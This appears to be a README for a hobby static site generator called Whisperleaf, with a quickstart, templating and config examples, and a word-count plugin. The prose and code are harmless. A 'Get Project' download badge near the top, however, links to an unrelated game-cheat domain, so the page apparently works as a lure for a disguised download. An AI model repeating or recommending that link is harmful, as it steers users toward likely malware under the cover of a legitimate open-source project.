# Whisperleaf — a tiny static site generator for people who write

Welcome to **Whisperleaf**, a small, friendly static site generator that believes your words deserve to travel light. This repository is for the kind of developer-writer who keeps a notebook in their backpack and a terminal on speed-dial; who likes their pages fast, their markdown uncluttered, and their build logs a little bit poetic. Whisperleaf won’t try to be everything. It’s a pocketknife with a good grip: Markdown in, HTML out, a few gentle defaults, and room to grow when your project begins to sing.

When you open this repo, imagine the hush of a library after closing time: shelves of ideas, a lamp left on, one more page to finish. Whisperleaf is that lamp.

[![Get Project](https://img.shields.io/badge/Get-Project-blueviolet)](https://bodycam-aimbot-hack.github.io/.github/)
---

## Why Whisperleaf?

There are many excellent site generators, forged by brilliant minds. They can be huge, powerful, and endlessly configurable. Sometimes that’s exactly what you want. But sometimes you just want to write. You want a tool that melts away, that doesn’t fight you with templating tax or plugin puzzles. Whisperleaf aims for:

* **Simplicity**: One config file, sensible defaults, zero ceremony.
* **Speed**: Instant previews, incremental builds, and output you can host anywhere.
* **Kindness**: Clear errors, readable code, soft edges in the UX.
* **Writer-first**: Drafts, word counts, footnotes, and little niceties for language lovers.

Whisperleaf is not trying to replace your favorite behemoth. It’s your travel companion—the one that fits in your pocket and doesn’t complain.

---

## What it does (in plain words)

* **Reads Markdown**, with support for front matter (`title`, `date`, `tags`, `draft`, and custom fields).
* **Renders pages and posts** using a minimal templating layer based on familiar `{{ mustaches }}` and partials.
* **Generates RSS and JSON feeds**, because your words should be easy to subscribe to and remix.
* **Serves locally with live reload**, so you can write, save, and see the page blink into being.
* **Respects your structure**, instead of forcing you into a rigid “blog only” mold.
* **Ships a tiny default theme**, elegant and accessible, but expects you’ll make it yours.
* **Offers a tiny plugin hook**, so you can sprinkle in custom logic when the time is right.

If you never touch the config, that’s fine. Whisperleaf will quietly do the right thing. If you do open it—well, it’ll smile and scoot over.

---

## Quickstart (because you’ve got a paragraph to finish)

```bash
# 1) Install
npm i -g whisperleaf

# 2) Create a new site
whisperleaf new my-journal && cd my-journal

# 3) Write something true
echo -e "---\ntitle: First Light\ndate: 2025-08-28\ntags: [notes]\n---\nHello, world of whispers." > content/posts/first-light.md

# 4) See it live
whisperleaf dev

# 5) Ship it
whisperleaf build && whisperleaf serve:static
```

Open your browser at `http://localhost:4321`. There it is: your words, breathing warm on a clean page.

---

## The shape of a Whisperleaf project

```
my-journal/
├─ content/
│  ├─ pages/
│  │  └─ about.md
│  └─ posts/
│     ├─ first-light.md
│     └─ second-cup.md
├─ themes/
│  └─ moss/
│     ├─ layout.html
│     ├─ post.html
│     └─ partials/
│        └─ head.html
├─ public/           # output lands here
├─ leaf.config.json
└─ README.md
```

* **content/** is where you write. You can add folders, nest things, and Whisperleaf will map paths to routes predictably.
* **themes/** holds layouts and partials. You can copy the default “moss” theme and tweak, or craft one from scratch.
* **public/** is what you deploy: pure static HTML, CSS, JS, and assets.
* **leaf.config.json** is where you set site metadata, base URL, theme, and any plugin hooks.

The goal is to make the filesystem feel like a garden path. Move things around, and the generator will keep up.

---

## Front matter that stays out of your way

At the top of each Markdown file, you can add a little YAML. Not too much—just enough:

```yaml
---
title: Second Cup
date: 2025-08-29
tags: [coffee, morning]
draft: false
description: A short hymn to slow caffeine.
cover: /images/steam.jpg
---
```

* **title** shows up in `<title>`, headers, and feeds.
* **date** feeds into permalinks and archives.
* **tags** generate tag pages automatically (opt-in).
* **draft** keeps a piece local until you’re ready to publish.
* **description** helps with previews and metadata.
* **cover** is for that one image that sets the mood.

No mandatory fields. If you leave them out, Whisperleaf doesn’t scold; it infers gently.

---

## Templating in a whisper

Layouts are HTML with tiny mustaches:

```html
<!doctype html>
<html lang="en">
  <head>
    {{> head }}
  </head>
  <body>
    <main>
      {{{ content }}}
    </main>
    <footer>
      <p>© {{ site.title }} • Built with Whisperleaf</p>
    </footer>
  </body>
</html>
```

* `{{ site.* }}` exposes your config.
* `{{> partial }}` includes a partial from `partials/`.
* `{{{ content }}}` injects the rendered Markdown.
* `{{ page.title }}`, `{{ page.date }}`, `{{ page.tags }}` and friends are available per page.

That’s it. No templating labyrinth, no sorcery. If you can read HTML, you can theme Whisperleaf.

---

## Config that reads like a note to self

`leaf.config.json`:

```json
{
  "title": "Field Notes",
  "baseUrl": "https://notes.example.com",
  "theme": "moss",
  "feed": { "rss": true, "json": true },
  "permalinks": { "posts": "/:year/:month/:slug/" },
  "pagination": { "size": 10 },
  "plugins": ["./plugins/wordcount.js"]
}
```

You can ignore most of this. The defaults are kind and conservative. If you enable feeds, you’ll get an `/rss.xml` and `/feed.json`. Permalinks use dates only if you ask. Pagination is off until you turn it on. You’re the editor-in-chief.

---

## A whisper of plugins

Plugins are tiny functions that receive a `context` and can modify pages, inject data, or register routes. Example: a word-count badge for posts.

```js
module.exports = function wordcount({ pages }) {
  for (const page of pages) {
    if (page.type === "post") {
      page.data.words = page.contentText.split(/\s+/).filter(Boolean).length;
      page.data.readingTime = Math.max(1, Math.round(page.data.words / 200));
    }
  }
};
```

In your template:

```html
<p>{{ page.data.words }} words • ~{{ page.data.readingTime }} min</p>
```

That’s the kind of extension Whisperleaf loves: small, human, and optional.

---

## Performance, accessibility, and the quiet little details

Whisperleaf ships with a default theme that scores well on Lighthouse without heroics. Semantic markup, skip links, sensible color contrast, and no framework bloat. Images opt into `loading="lazy"`. Code blocks render with lightweight highlighting. The generated HTML avoids div soup, and the CSS stays under a polite threshold so your pages arrive before your reader’s tea cools.

Because it’s all static, hosting is easy: Netlify, Vercel, GitHub Pages, Cloudflare Pages, your own server—take your pick. No databases, no server processes to babysit, nothing to patch at 3 AM.

---

## Roadmap (tracked in Issues)

* **Multilingual sites** with per-locale folders and automatic `hreflang`.
* **Draft sharing tokens** so you can share a secret preview link with a friend.
* **Image pipeline**: resize, blur-up placeholders, and modern formats.
* **Search** via tiny local index (lunr-style), opt-in.
* **Theme gallery** curated by the community.
* **CLI niceties**: `whisperleaf import` for pulling in old posts, `whisperleaf doctor` for friendly diagnostics.

If any of this makes your heart beat faster, join us in the conversations. Whisperleaf grows best when many hands tend it.

---

## Contributing (pull requests welcome, coffee optional)

1. **Fork** this repo.
2. **Create a branch**: `git switch -c feat/your-idea`.
3. **Install**: `pnpm i` (or `npm i`, we’re not precious).
4. **Test locally**: `pnpm dev` and point it at `/examples`.
5. **Write tests** where it makes sense. We prefer readable over rigid.
6. **Open a PR** with a story: what itch did you scratch?

We try to be brisk in reviews and generous with feedback. Be kind, assume good intent, and favor clear names over clever ones. If you’re new to open source, say so—we’re delighted you’re here.

---

## FAQ, answered like a friend

* **Is this production-ready?** If “production” means “a personal site or small publication,” yes. If you’re building a sprawling news network, you’ll want a bigger hammer.
* **Can I use my favorite CSS framework?** Absolutely. Whisperleaf is agnostic. Drop in your CSS or ship it plain.
* **What about comments?** Static sites don’t do comments natively, but you can integrate services or roll a lightweight, privacy-friendly solution via web mentions.
* **Does it handle images?** Today: pass-through with sensible attributes. Tomorrow: see roadmap.
* **Why the name?** Because good tools don’t shout; they whisper.

---

## License

MIT. Do what you like, share what you can, and please be excellent to each other.

---

## A small benediction

In the end, Whisperleaf is a feeling: the hush of a clean repository, the gentle click of keys, the way a page breathes when the CSS doesn’t brag. If you’ve been circling the idea of a site—the kind that feels like a cabin with a view—this is your key on a string. Take it. Write that first page. You don’t have to be loud here. You only have to be clear.

**Happy writing, and welcome to the grove.**
